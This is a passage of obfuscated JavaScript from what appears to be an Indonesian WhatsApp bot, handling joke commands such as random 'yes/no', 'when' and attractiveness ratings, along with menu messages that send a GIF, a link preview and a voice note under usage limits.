                'text': _0x17c99d,
                'contextInfo': {
                    'externalAdReply': {
                        'title': _0x5804c8(0xaa6),
                        'body': _0x5804c8(0xa48),
                        'thumbnailUrl': _0x5804c8(0x15f),
                        'sourceUrl': '',
                        'mediaType': 0x1,
                        'renderLargerThumbnail': !![]
                    }
                }
            }, {
                'quoted': _0x51e31f
            });
        }
        limitAdd(_0x1b1e88[_0x5804c8(0xd13)], limit);
        break;
        case 'apakah': {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (isLimit(_0x1b1e88[_0x5804c8(0xd13)], _0x75f0ff, _0x7b6ab6, _0x49d6b7, limit)) return _0x358f3b(_0x5804c8(0x887) + _0x3b7c58 + _0x5804c8(0xbc1));
            if (!q) return _0x358f3b(_0x5804c8(0xbf5) + _0x453fc1 + _0x5804c8(0x338) + _0x453fc1 + _0x5804c8(0x445));
            const _0x2b6f9d = [_0x5804c8(0xa82), _0x5804c8(0xd71), _0x5804c8(0x845), _0x5804c8(0x96d)],
                _0x4dea4b = _0x2b6f9d[Math['floor'](Math[_0x5804c8(0xbbf)]() * _0x2b6f9d[_0x5804c8(0x977)])];
            _0x358f3b(_0x5804c8(0x5b8) + q + '\x0aJawaban : ' + _0x4dea4b);
        }
        limitAdd(_0x1b1e88[_0x5804c8(0xd13)], limit);
        break;
        case _0x5804c8(0x267): {
            if (_0x4343cd) return _0x358f3b('Lu di ban kocak awokwok');
            if (isLimit(_0x1b1e88[_0x5804c8(0xd13)], _0x75f0ff, _0x7b6ab6, _0x49d6b7, limit)) return _0x358f3b(_0x5804c8(0x887) + _0x3b7c58 + _0x5804c8(0xbc1));
            if (!q) return _0x358f3b(_0x5804c8(0xbf5) + _0x453fc1 + _0x5804c8(0x338) + _0x453fc1 + _0x5804c8(0x2ca));
            const _0x7069db = [_0x5804c8(0x1c8), _0x5804c8(0x8fb), _0x5804c8(0xcbf), _0x5804c8(0x88b)],
                _0x824331 = _0x7069db[Math[_0x5804c8(0xa2b)](Math[_0x5804c8(0xbbf)]() * _0x7069db[_0x5804c8(0x977)])];
            _0x358f3b(_0x5804c8(0x5b8) + q + _0x5804c8(0x7ad) + _0x824331);
        }
        limitAdd(_0x1b1e88[_0x5804c8(0xd13)], limit);
        break;
        case _0x5804c8(0x7b5): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (isLimit(_0x1b1e88['sender'], _0x75f0ff, _0x7b6ab6, _0x49d6b7, limit)) return _0x358f3b(_0x5804c8(0x887) + _0x3b7c58 + 'limit untuk mengecek limit');
            if (!q) return _0x358f3b(_0x5804c8(0xbf5) + _0x453fc1 + _0x5804c8(0x338) + _0x453fc1 + ' cara mengatasi sakit hati');
            const _0x2bd4b1 = [_0x5804c8(0xd06), 'Sulit Itu Bro', _0x5804c8(0x563), 'Coba Deh Cari Di Gugel', 'astaghfirallah Beneran???', _0x5804c8(0x9e7), _0x5804c8(0x8bf), _0x5804c8(0xba9)],
                _0x5533b3 = _0x2bd4b1[Math[_0x5804c8(0xa2b)](Math[_0x5804c8(0xbbf)]() * _0x2bd4b1[_0x5804c8(0x977)])];
            _0x358f3b(_0x5804c8(0x5b8) + q + _0x5804c8(0x7ad) + _0x5533b3);
        }
        limitAdd(_0x1b1e88[_0x5804c8(0xd13)], limit);
        break;
        case 'rate': {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (isLimit(_0x1b1e88['sender'], _0x75f0ff, _0x7b6ab6, _0x49d6b7, limit)) return _0x358f3b(_0x5804c8(0x887) + _0x3b7c58 + 'limit untuk mengecek limit');
            if (!q) return _0x358f3b(_0x5804c8(0xbf5) + _0x453fc1 + _0x5804c8(0x338) + _0x453fc1 + ' Gambar aku');
            const _0x33c755 = ['5', '10', '15', '20', '25', '30', '35', '40', '45', '50', '55', '60', '65', '70', '75', '80', '85', '90', '95', _0x5804c8(0x990)],
                _0xe6dff3 = _0x33c755[Math[_0x5804c8(0xa2b)](Math[_0x5804c8(0xbbf)]() * _0x33c755[_0x5804c8(0x977)])];
            _0x358f3b(_0x5804c8(0x345) + q + _0x5804c8(0x5aa) + _0xe6dff3 + '%*');
        }
        limitAdd(_0x1b1e88['sender'], limit);
        break;
        case 'gantengcek':
        case _0x5804c8(0x5e2): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (isLimit(_0x1b1e88[_0x5804c8(0xd13)], _0x75f0ff, _0x7b6ab6, _0x49d6b7, limit)) return _0x358f3b(_0x5804c8(0x887) + _0x3b7c58 + _0x5804c8(0xbc1));
            if (!q) return _0x358f3b('Penggunaan ' + _0x453fc1 + _0x5804c8(0x971) + _0x453fc1 + _0x5804c8(0xad8));
            const _0x1ab630 = [_0x5804c8(0xbc2), _0x5804c8(0xb94), _0x5804c8(0x600), _0x5804c8(0xc11), _0x5804c8(0x6d6), '60% Hai Ganteng🐊', _0x5804c8(0xae4), '62% Bang Ganteng><', '74% abang ni ganteng deh><', _0x5804c8(0xbf9), _0x5804c8(0x786), _0x5804c8(0xb8d), _0x5804c8(0xbc5), _0x5804c8(0xa89), _0x5804c8(0xaa9), '82% wihh abang Pasti Sering Perawatan kan??', _0x5804c8(0x32d), '39% Lebih Semangat🐊'],
                _0x279e6e = _0x1ab630[Math[_0x5804c8(0xa2b)](Math[_0x5804c8(0xbbf)]() * _0x1ab630['length'])];
            _0x358f3b(_0x5804c8(0x870) + q + _0x5804c8(0x5aa) + _0x279e6e + '*');
        }
        limitAdd(_0x1b1e88[_0x5804c8(0xd13)], limit);
        break;
        case _0x5804c8(0x89c):
        case _0x5804c8(0x55a): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (isLimit(_0x1b1e88['sender'], _0x75f0ff, _0x7b6ab6, _0x49d6b7, limit)) return _0x358f3b('Limit kamu sudah habis silahkan kirim ' + _0x3b7c58 + 'limit untuk mengecek limit');
            if (!q) return _0x358f3b(_0x5804c8(0xbf5) + _0x453fc1 + _0x5804c8(0x971) + _0x453fc1 + _0x5804c8(0x28c));
            const _0x4dfcc3 = [_0x5804c8(0xa30), _0x5804c8(0x23f), _0x5804c8(0x82f), _0x5804c8(0x9eb), _0x5804c8(0xbbd), _0x5804c8(0x2a7), '70% Hai Ukhty🐊', _0x5804c8(0x382), '74% Kakak ni cantik deh><', '83% Love You Kakak><', _0x5804c8(0x646), _0x5804c8(0x792), _0x5804c8(0xb0f), _0x5804c8(0x3d7), _0x5804c8(0x96b), _0x5804c8(0x63f), _0x5804c8(0x32d), _0x5804c8(0x76d)],
                _0x2c8230 = _0x4dfcc3[Math[_0x5804c8(0xa2b)](Math[_0x5804c8(0xbbf)]() * _0x4dfcc3[_0x5804c8(0x977)])];
            _0x358f3b('Nama : ' + q + '\x0aJawaban : *' + _0x2c8230 + '*');
        }
        limitAdd(_0x1b1e88[_0x5804c8(0xd13)], limit);
        break;
        case 'sangecek':
        case _0x5804c8(0x92e):
        case _0x5804c8(0x244):
        case _0x5804c8(0x6bf):
        case _0x5804c8(0x324):
        case _0x5804c8(0x57b): {
            if (_0x4343cd) return _0x358f3b('Lu di ban kocak awokwok');
            if (isLimit(_0x1b1e88[_0x5804c8(0xd13)], _0x75f0ff, _0x7b6ab6, _0x49d6b7, limit)) return _0x358f3b(_0x5804c8(0x887) + _0x3b7c58 + 'limit untuk mengecek limit');
            if (!q) return _0x358f3b(_0x5804c8(0xbf5) + _0x453fc1 + _0x5804c8(0x971) + _0x453fc1 + _0x5804c8(0x28c));
            const _0x1d26ef = ['5', '10', '15', '20', '25', '30', '35', '40', '45', '50', '55', '60', '65', '70', '75', '80', '85', '90', '95', _0x5804c8(0x990)],
                _0x4be66e = _0x1d26ef[Math[_0x5804c8(0xa2b)](Math[_0x5804c8(0xbbf)]() * _0x1d26ef['length'])];
            _0x358f3b('Nama : ' + q + '\x0aJawaban : *' + _0x4be66e + '%*');
        }
        limitAdd(_0x1b1e88[_0x5804c8(0xd13)], limit);
        break;
        case 'kapankah': {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (isLimit(_0x1b1e88[_0x5804c8(0xd13)], _0x75f0ff, _0x7b6ab6, _0x49d6b7, limit)) return _0x358f3b(_0x5804c8(0x887) + _0x3b7c58 + _0x5804c8(0xbc1));
            if (!q) return _0x358f3b(_0x5804c8(0xbf5) + _0x453fc1 + _0x5804c8(0xa6b) + _0x453fc1 + _0x5804c8(0x4f1));
            const _0x94fb52 = ['5 Hari Lagi', _0x5804c8(0xc44), '15 Hari Lagi', '20 Hari Lagi', '25 Hari Lagi', _0x5804c8(0x811), _0x5804c8(0x6db), _0x5804c8(0x5e5), _0x5804c8(0xa16), '50 Hari Lagi', _0x5804c8(0xd8d), '60 Hari Lagi', _0x5804c8(0x2f3), _0x5804c8(0x5a1), _0x5804c8(0x3c1), _0x5804c8(0xa76), _0x5804c8(0xcd7), _0x5804c8(0xbac), _0x5804c8(0x7c8), _0x5804c8(0x5bc), '5 Bulan Lagi', '10 Bulan Lagi', '15 Bulan Lagi', _0x5804c8(0x51a), '25 Bulan Lagi', _0x5804c8(0x41c), '35 Bulan Lagi', _0x5804c8(0xcc0), _0x5804c8(0x9fd), '50 Bulan Lagi', _0x5804c8(0x4ed), _0x5804c8(0xd0a), '65 Bulan Lagi', _0x5804c8(0x248), _0x5804c8(0x746), _0x5804c8(0x63b), _0x5804c8(0x937), _0x5804c8(0x4f4), _0x5804c8(0xa42), _0x5804c8(0x3d2), '1 Tahun Lagi', _0x5804c8(0x877), _0x5804c8(0xc9b), _0x5804c8(0x2c6), _0x5804c8(0x95d), _0x5804c8(0x60e), 'Lusa', 'Abis Command Ini Juga Lu ' + q],
                _0xf55493 = _0x94fb52[Math['floor'](Math['random']() * _0x94fb52[_0x5804c8(0x977)])];
            _0x358f3b(_0x5804c8(0x29e) + q + _0x5804c8(0x5aa) + _0xf55493 + '*');
        }
        limitAdd(_0x1b1e88[_0x5804c8(0xd13)], limit);
        break;
        case 'wangy': {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            if (isLimit(_0x1b1e88[_0x5804c8(0xd13)], _0x75f0ff, _0x7b6ab6, _0x49d6b7, limit)) return _0x358f3b('Limit kamu sudah habis silahkan kirim ' + _0x3b7c58 + 'limit untuk mengecek limit');
            if (!q) return _0x358f3b(_0x5804c8(0xcba) + _0x3b7c58 + _0x5804c8(0x44d));
            qq = q[_0x5804c8(0xafb)](), awikwok = qq + ' ' + qq + ' ' + qq + _0x5804c8(0xd52) + qq + _0x5804c8(0xcfd) + qq + ' AAAAAAAAH ~ Rambutnya.... aaah rambutnya juga pengen aku elus-elus ~~ AAAAAH ' + qq + _0x5804c8(0x8b2) + qq + _0x5804c8(0x1d9) + qq + _0x5804c8(0x6df) + qq + _0x5804c8(0x214) + qq + _0x5804c8(0x2d8) + qq + _0x5804c8(0x290) + qq + _0x5804c8(0x825) + q + ' aku gak mau merelakan ' + qq + _0x5804c8(0xb77) + qq + _0x5804c8(0x633), _0x358f3b(awikwok);
        }
        limitAdd(_0x1b1e88[_0x5804c8(0xd13)], limit);
        break;
        case _0x5804c8(0x4de): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            _0x1c7aed('#allmenu', _0x1b1e88[_0x5804c8(0xd13)], _cmd);
            let _0x1756d1 = _0x1c5671(0x1, 0x1, 0x7e8),
                _0xfba3c7 = _0x1c5671(0x19, 0xc, 0x7e7);
            await _0x40d7a3();
            let _0x28cb04 = '' + _0x932571[_0x5804c8(0x9d7)];
            await _0x614da8['sendMessage'](_0x1b1e88[_0x5804c8(0x60f)], {
                'video': {
                    'url': _0x28cb04
                },
                'gifPlayback': !![],
                'caption': _0x54b27e(_0x96c6c4, _0x2eeea8, _0x32b235, _0xfba3c7, _0x1756d1, _0xa54fd1, _0xe55fb7, _0x33c99f, _0x358b6e, _0x2d6392, tanggal, runtime, _0x7b6ab6, _0x75f0ff, _0x1b1e88['sender'], _0x49d6b7, limit, _0x1efa36, glimit, balance, _0x3b7c58),
                'contextInfo': {
                    'externalAdReply': {
                        'title': _0x5804c8(0x178) + _0x32b235 + _0x5804c8(0x92d) + _0x2eeea8,
                        'body': '𝙅𝙖𝙣𝙜𝙖𝙣 𝙨𝙥𝙖𝙢 𝙗𝙤𝙩 𝙮𝙖𝙝𝙝',
                        'thumbnailUrl': _0xfc3dc4,
                        'sourceUrl': _0x10c563,
                        'mediaType': 0x1,
                        'renderLargerThumbnail': !![]
                    }
                }
            }, {
                'quoted': _0x1b1e88
            }), _0x614da8[_0x5804c8(0x938)](_0x1b1e88['chat'], {
                'audio': fs[_0x5804c8(0x456)](_0x932571['audio_di_bagian_menu']),
                'mimetype': 'audio/mpeg',
                'ptt': !![]
            }, {
                'quoted': _0x1b1e88
            });
        }
        break;
        case _0x5804c8(0xbe9):
        case _0x5804c8(0x908):
        case _0x5804c8(0xc36): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            _0x1c7aed('#menu', _0x1b1e88['sender'], _cmd);
            let _0x484e62 = _0x1c5671(0x1, 0x1, 0x7e8),
                _0x1a03d5 = _0x1c5671(0x19, 0xc, 0x7e7);
            await _0x40d7a3();
            let _0x41a978 = '' + _0x932571[_0x5804c8(0x9d7)];
            await _0x614da8['sendMessage'](_0x1b1e88[_0x5804c8(0x60f)], {
                'video': {
                    'url': _0x41a978
                },
                'gifPlayback': !![],
                'caption': _0x4a1a0b(_0x96c6c4, _0x2eeea8, _0x32b235, _0x1a03d5, _0x484e62, _0xa54fd1, _0xe55fb7, _0x33c99f, _0x358b6e, _0x2d6392, tanggal, runtime, _0x7b6ab6, _0x75f0ff, _0x1b1e88[_0x5804c8(0xd13)], _0x49d6b7, limit, _0x1efa36, glimit, balance, _0x3b7c58),
                'contextInfo': {
                    'externalAdReply': {
                        'title': 'Halo ' + _0x32b235 + _0x5804c8(0x92d) + _0x2eeea8,
                        'body': '𝙅𝙖𝙣𝙜𝙖𝙣 𝙨𝙥𝙖𝙢 𝙗𝙤𝙩 𝙮𝙖𝙝𝙝',
                        'thumbnailUrl': _0xfc3dc4,
                        'sourceUrl': _0x10c563,
                        'mediaType': 0x1,
                        'renderLargerThumbnail': !![]
                    }
                }
            }, {
                'quoted': _0x1b1e88
            }), _0x614da8[_0x5804c8(0x938)](_0x1b1e88[_0x5804c8(0x60f)], {
                'audio': fs[_0x5804c8(0x456)](_0x932571[_0x5804c8(0x304)]),
                'mimetype': _0x5804c8(0x8d4),
                'ptt': !![]
            }, {
                'quoted': _0x1b1e88
            });
        }
        break;
        case _0x5804c8(0xd72): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            _0x1c7aed(_0x5804c8(0x7c2), _0x1b1e88[_0x5804c8(0xd13)], _cmd);
            let _0x4e80e2 = _0x1c5671(0x1, 0x1, 0x7e8),
                _0x5a9404 = _0x1c5671(0x19, 0xc, 0x7e7);
            await _0x40d7a3();
            let _0x592a69 = '' + _0x932571['gifmenu'];
            await _0x614da8['sendMessage'](_0x1b1e88[_0x5804c8(0x60f)], {
                'video': {
                    'url': _0x592a69
                },
                'gifPlayback': !![],
                'caption': _0x5ebb4f(_0x96c6c4, _0x2eeea8, _0x32b235, _0x5a9404, _0x4e80e2, _0xa54fd1, _0xe55fb7, _0x33c99f, _0x358b6e, _0x2d6392, tanggal, runtime, _0x7b6ab6, _0x75f0ff, _0x1b1e88[_0x5804c8(0xd13)], _0x49d6b7, limit, _0x1efa36, glimit, balance, _0x3b7c58),
                'contextInfo': {
                    'externalAdReply': {
                        'title': _0x5804c8(0x178) + _0x32b235 + _0x5804c8(0x92d) + _0x2eeea8,
                        'body': _0x5804c8(0x13b),
                        'thumbnailUrl': _0xfc3dc4,
                        'sourceUrl': _0x10c563,
                        'mediaType': 0x1,
                        'renderLargerThumbnail': !![]
                    }
                }
            }, {
                'quoted': _0x1b1e88
            }), _0x614da8[_0x5804c8(0x938)](_0x1b1e88[_0x5804c8(0x60f)], {
                'audio': fs[_0x5804c8(0x456)](_0x932571[_0x5804c8(0x304)]),
                'mimetype': _0x5804c8(0x8d4),
                'ptt': !![]
            }, {
                'quoted': _0x1b1e88
            });
        }
        break;
        case 'convertmenu': {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            _0x1c7aed(_0x5804c8(0x442), _0x1b1e88[_0x5804c8(0xd13)], _cmd);
            let _0x1b3e92 = _0x1c5671(0x1, 0x1, 0x7e8),
                _0x944317 = _0x1c5671(0x19, 0xc, 0x7e7);
            await _0x40d7a3();
            let _0xdbc0b8 = '' + _0x932571['gifmenu'];
            await _0x614da8[_0x5804c8(0x938)](_0x1b1e88[_0x5804c8(0x60f)], {
                'video': {
                    'url': _0xdbc0b8
                },
                'gifPlayback': !![],
                'caption': _0x745546(_0x96c6c4, _0x2eeea8, _0x32b235, _0x944317, _0x1b3e92, _0xa54fd1, _0xe55fb7, _0x33c99f, _0x358b6e, _0x2d6392, tanggal, runtime, _0x7b6ab6, _0x75f0ff, _0x1b1e88[_0x5804c8(0xd13)], _0x49d6b7, limit, _0x1efa36, glimit, balance, _0x3b7c58),
                'contextInfo': {
                    'externalAdReply': {
                        'title': _0x5804c8(0x178) + _0x32b235 + _0x5804c8(0x92d) + _0x2eeea8,
                        'body': '𝙅𝙖𝙣𝙜𝙖𝙣 𝙨𝙥𝙖𝙢 𝙗𝙤𝙩 𝙮𝙖𝙝𝙝',
                        'thumbnailUrl': _0xfc3dc4,
                        'sourceUrl': _0x10c563,
                        'mediaType': 0x1,
                        'renderLargerThumbnail': !![]
                    }
                }
            }, {
                'quoted': _0x1b1e88
            }), _0x614da8[_0x5804c8(0x938)](_0x1b1e88[_0x5804c8(0x60f)], {
                'audio': fs[_0x5804c8(0x456)](_0x932571[_0x5804c8(0x304)]),
                'mimetype': _0x5804c8(0x8d4),
                'ptt': !![]
            }, {
                'quoted': _0x1b1e88
            });
        }
        break;
        case 'voicechanger': {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            _0x1c7aed('#voicechanger', _0x1b1e88[_0x5804c8(0xd13)], _cmd);
            let _0x125979 = _0x1c5671(0x1, 0x1, 0x7e8),
                _0x5e4daf = _0x1c5671(0x19, 0xc, 0x7e7);
            await _0x40d7a3();
            let _0x4a00e7 = '' + _0x932571[_0x5804c8(0x9d7)];
            await _0x614da8[_0x5804c8(0x938)](_0x1b1e88[_0x5804c8(0x60f)], {
                'video': {
                    'url': _0x4a00e7
                },
                'gifPlayback': !![],
                'caption': _0xd7482(_0x96c6c4, _0x2eeea8, _0x32b235, _0x5e4daf, _0x125979, _0xa54fd1, _0xe55fb7, _0x33c99f, _0x358b6e, _0x2d6392, tanggal, runtime, _0x7b6ab6, _0x75f0ff, _0x1b1e88[_0x5804c8(0xd13)], _0x49d6b7, limit, _0x1efa36, glimit, balance, _0x3b7c58),
                'contextInfo': {
                    'externalAdReply': {
                        'title': 'Halo ' + _0x32b235 + _0x5804c8(0x92d) + _0x2eeea8,
                        'body': '𝙅𝙖𝙣𝙜𝙖𝙣 𝙨𝙥𝙖𝙢 𝙗𝙤𝙩 𝙮𝙖𝙝𝙝',
                        'thumbnailUrl': _0xfc3dc4,
                        'sourceUrl': _0x10c563,
                        'mediaType': 0x1,
                        'renderLargerThumbnail': !![]
                    }
                }
            }, {
                'quoted': _0x1b1e88
            }), _0x614da8[_0x5804c8(0x938)](_0x1b1e88[_0x5804c8(0x60f)], {
                'audio': fs[_0x5804c8(0x456)](_0x932571['audio_di_bagian_menu']),
                'mimetype': _0x5804c8(0x8d4),
                'ptt': !![]
            }, {
                'quoted': _0x1b1e88
            });
        }
        break;
        case _0x5804c8(0x8e7): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            _0x1c7aed('#anonymousmenu', _0x1b1e88['sender'], _cmd);
            let _0x5d5b89 = _0x1c5671(0x1, 0x1, 0x7e8),
                _0x5a1da7 = _0x1c5671(0x19, 0xc, 0x7e7);
            await _0x40d7a3();
            let _0x663ea1 = '' + _0x932571['gifmenu'];
            await _0x614da8[_0x5804c8(0x938)](_0x1b1e88[_0x5804c8(0x60f)], {
                'video': {
                    'url': _0x663ea1
                },
                'gifPlayback': !![],
                'caption': _0x2d1704(_0x96c6c4, _0x2eeea8, _0x32b235, _0x5a1da7, _0x5d5b89, _0xa54fd1, _0xe55fb7, _0x33c99f, _0x358b6e, _0x2d6392, tanggal, runtime, _0x7b6ab6, _0x75f0ff, _0x1b1e88[_0x5804c8(0xd13)], _0x49d6b7, limit, _0x1efa36, glimit, balance, _0x3b7c58),
                'contextInfo': {
                    'externalAdReply': {
                        'title': _0x5804c8(0x178) + _0x32b235 + _0x5804c8(0x92d) + _0x2eeea8,
                        'body': '𝙅𝙖𝙣𝙜𝙖𝙣 𝙨𝙥𝙖𝙢 𝙗𝙤𝙩 𝙮𝙖𝙝𝙝',
                        'thumbnailUrl': _0xfc3dc4,
                        'sourceUrl': _0x10c563,
                        'mediaType': 0x1,
                        'renderLargerThumbnail': !![]
                    }
                }
            }, {
                'quoted': _0x1b1e88
            }), _0x614da8['sendMessage'](_0x1b1e88[_0x5804c8(0x60f)], {
                'audio': fs['readFileSync'](_0x932571[_0x5804c8(0x304)]),
                'mimetype': _0x5804c8(0x8d4),
                'ptt': !![]
            }, {
                'quoted': _0x1b1e88
            });
        }
        break;
        case 'storemenu': {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            _0x1c7aed('#storemenu', _0x1b1e88['sender'], _cmd);
            let _0x413de1 = _0x1c5671(0x1, 0x1, 0x7e8),
                _0x32b3f2 = _0x1c5671(0x19, 0xc, 0x7e7);
            await _0x40d7a3();
            let _0x17285e = '' + _0x932571[_0x5804c8(0x9d7)];
            await _0x614da8[_0x5804c8(0x938)](_0x1b1e88[_0x5804c8(0x60f)], {
                'video': {
                    'url': _0x17285e
                },
                'gifPlayback': !![],
                'caption': _0x55b4b7(_0x96c6c4, _0x2eeea8, _0x32b235, _0x32b3f2, _0x413de1, _0xa54fd1, _0xe55fb7, _0x33c99f, _0x358b6e, _0x2d6392, tanggal, runtime, _0x7b6ab6, _0x75f0ff, _0x1b1e88[_0x5804c8(0xd13)], _0x49d6b7, limit, _0x1efa36, glimit, balance, _0x3b7c58),
                'contextInfo': {
                    'externalAdReply': {
                        'title': _0x5804c8(0x178) + _0x32b235 + _0x5804c8(0x92d) + _0x2eeea8,
                        'body': _0x5804c8(0x13b),
                        'thumbnailUrl': _0xfc3dc4,
                        'sourceUrl': _0x10c563,
                        'mediaType': 0x1,
                        'renderLargerThumbnail': !![]
                    }
                }
            }, {
                'quoted': _0x1b1e88
            }), _0x614da8['sendMessage'](_0x1b1e88['chat'], {
                'audio': fs[_0x5804c8(0x456)](_0x932571[_0x5804c8(0x304)]),
                'mimetype': _0x5804c8(0x8d4),
                'ptt': !![]
            }, {
                'quoted': _0x1b1e88
            });
        }
        break;
        case _0x5804c8(0xa69): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            _0x1c7aed(_0x5804c8(0x40a), _0x1b1e88[_0x5804c8(0xd13)], _cmd);
            let _0x3f445c = _0x1c5671(0x1, 0x1, 0x7e8),
                _0x5ed88f = _0x1c5671(0x19, 0xc, 0x7e7);
            await _0x40d7a3();
            let _0x2fc422 = '' + _0x932571[_0x5804c8(0x9d7)];
            await _0x614da8['sendMessage'](_0x1b1e88[_0x5804c8(0x60f)], {
                'video': {
                    'url': _0x2fc422
                },
                'gifPlayback': !![],
                'caption': _0x54731b(_0x96c6c4, _0x2eeea8, _0x32b235, _0x5ed88f, _0x3f445c, _0xa54fd1, _0xe55fb7, _0x33c99f, _0x358b6e, _0x2d6392, tanggal, runtime, _0x7b6ab6, _0x75f0ff, _0x1b1e88[_0x5804c8(0xd13)], _0x49d6b7, limit, _0x1efa36, glimit, balance, _0x3b7c58),
                'contextInfo': {
                    'externalAdReply': {
                        'title': 'Halo ' + _0x32b235 + _0x5804c8(0x92d) + _0x2eeea8,
                        'body': _0x5804c8(0x13b),
                        'thumbnailUrl': _0xfc3dc4,
                        'sourceUrl': _0x10c563,
                        'mediaType': 0x1,
                        'renderLargerThumbnail': !![]
                    }
                }
            }, {
                'quoted': _0x1b1e88
            }), _0x614da8[_0x5804c8(0x938)](_0x1b1e88[_0x5804c8(0x60f)], {
                'audio': fs[_0x5804c8(0x456)](_0x932571[_0x5804c8(0x304)]),
                'mimetype': 'audio/mpeg',
                'ptt': !![]
            }, {
                'quoted': _0x1b1e88
            });
        }
        break;
        case 'gamemenu': {
            if (_0x4343cd) return _0x358f3b('Lu di ban kocak awokwok');
            _0x1c7aed(_0x5804c8(0x30a), _0x1b1e88[_0x5804c8(0xd13)], _cmd);
            let _0x5c1eb4 = _0x1c5671(0x1, 0x1, 0x7e8),
                _0x44d4cc = _0x1c5671(0x19, 0xc, 0x7e7);
            await _0x40d7a3();
            let _0x339eb9 = '' + _0x932571['gifmenu'];
            await _0x614da8['sendMessage'](_0x1b1e88['chat'], {
                'video': {
                    'url': _0x339eb9
                },
                'gifPlayback': !![],
                'caption': _0x561d84(_0x96c6c4, _0x2eeea8, _0x32b235, _0x44d4cc, _0x5c1eb4, _0xa54fd1, _0xe55fb7, _0x33c99f, _0x358b6e, _0x2d6392, tanggal, runtime, _0x7b6ab6, _0x75f0ff, _0x1b1e88[_0x5804c8(0xd13)], _0x49d6b7, limit, _0x1efa36, glimit, balance, _0x3b7c58),
                'contextInfo': {
                    'externalAdReply': {
                        'title': _0x5804c8(0x178) + _0x32b235 + _0x5804c8(0x92d) + _0x2eeea8,
                        'body': _0x5804c8(0x13b),
                        'thumbnailUrl': _0xfc3dc4,
                        'sourceUrl': _0x10c563,
                        'mediaType': 0x1,
                        'renderLargerThumbnail': !![]
                    }
                }
            }, {
                'quoted': _0x1b1e88
            }), _0x614da8[_0x5804c8(0x938)](_0x1b1e88['chat'], {
                'audio': fs[_0x5804c8(0x456)](_0x932571[_0x5804c8(0x304)]),
                'mimetype': 'audio/mpeg',
                'ptt': !![]
            }, {
                'quoted': _0x1b1e88
            });
        }
        break;
        case _0x5804c8(0x58c): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            _0x1c7aed(_0x5804c8(0xc39), _0x1b1e88[_0x5804c8(0xd13)], _cmd);
            let _0x3e04a2 = _0x1c5671(0x1, 0x1, 0x7e8),
                _0x3c516c = _0x1c5671(0x19, 0xc, 0x7e7);
            await _0x40d7a3();
            let _0x2ce963 = '' + _0x932571[_0x5804c8(0x9d7)];
            await _0x614da8[_0x5804c8(0x938)](_0x1b1e88[_0x5804c8(0x60f)], {
                'video': {
                    'url': _0x2ce963
                },
                'gifPlayback': !![],
                'caption': _0x85a4b7(_0x96c6c4, _0x2eeea8, _0x32b235, _0x3c516c, _0x3e04a2, _0xa54fd1, _0xe55fb7, _0x33c99f, _0x358b6e, _0x2d6392, tanggal, runtime, _0x7b6ab6, _0x75f0ff, _0x1b1e88[_0x5804c8(0xd13)], _0x49d6b7, limit, _0x1efa36, glimit, balance, _0x3b7c58),
                'contextInfo': {
                    'externalAdReply': {
                        'title': 'Halo ' + _0x32b235 + _0x5804c8(0x92d) + _0x2eeea8,
                        'body': _0x5804c8(0x13b),
                        'thumbnailUrl': _0xfc3dc4,
                        'sourceUrl': _0x10c563,
                        'mediaType': 0x1,
                        'renderLargerThumbnail': !![]
                    }
                }
            }, {
                'quoted': _0x1b1e88
            }), _0x614da8[_0x5804c8(0x938)](_0x1b1e88[_0x5804c8(0x60f)], {
                'audio': fs['readFileSync'](_0x932571[_0x5804c8(0x304)]),
                'mimetype': 'audio/mpeg',
                'ptt': !![]
            }, {
                'quoted': _0x1b1e88
            });
        }
        break;
        case _0x5804c8(0x415): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            _0x1c7aed('#downloadmenu', _0x1b1e88[_0x5804c8(0xd13)], _cmd);
            let _0xaae13 = _0x1c5671(0x1, 0x1, 0x7e8),
                _0x5be120 = _0x1c5671(0x19, 0xc, 0x7e7);
            await _0x40d7a3();
            let _0x263e74 = '' + _0x932571[_0x5804c8(0x9d7)];
            await _0x614da8[_0x5804c8(0x938)](_0x1b1e88['chat'], {
                'video': {
                    'url': _0x263e74
                },
                'gifPlayback': !![],
                'caption': _0x47e012(_0x96c6c4, _0x2eeea8, _0x32b235, _0x5be120, _0xaae13, _0xa54fd1, _0xe55fb7, _0x33c99f, _0x358b6e, _0x2d6392, tanggal, runtime, _0x7b6ab6, _0x75f0ff, _0x1b1e88[_0x5804c8(0xd13)], _0x49d6b7, limit, _0x1efa36, glimit, balance, _0x3b7c58),
                'contextInfo': {
                    'externalAdReply': {
                        'title': _0x5804c8(0x178) + _0x32b235 + _0x5804c8(0x92d) + _0x2eeea8,
                        'body': '𝙅𝙖𝙣𝙜𝙖𝙣 𝙨𝙥𝙖𝙢 𝙗𝙤𝙩 𝙮𝙖𝙝𝙝',
                        'thumbnailUrl': _0xfc3dc4,
                        'sourceUrl': _0x10c563,
                        'mediaType': 0x1,
                        'renderLargerThumbnail': !![]
                    }
                }
            }, {
                'quoted': _0x1b1e88
            }), _0x614da8[_0x5804c8(0x938)](_0x1b1e88['chat'], {
                'audio': fs[_0x5804c8(0x456)](_0x932571[_0x5804c8(0x304)]),
                'mimetype': 'audio/mpeg',
                'ptt': !![]
            }, {
                'quoted': _0x1b1e88
            });
        }
        break;
        case _0x5804c8(0x842): {
            if (_0x4343cd) return _0x358f3b(_0x5804c8(0x6d2));
            _0x1c7aed('#searchmenu', _0x1b1e88[_0x5804c8(0xd13)], _cmd);
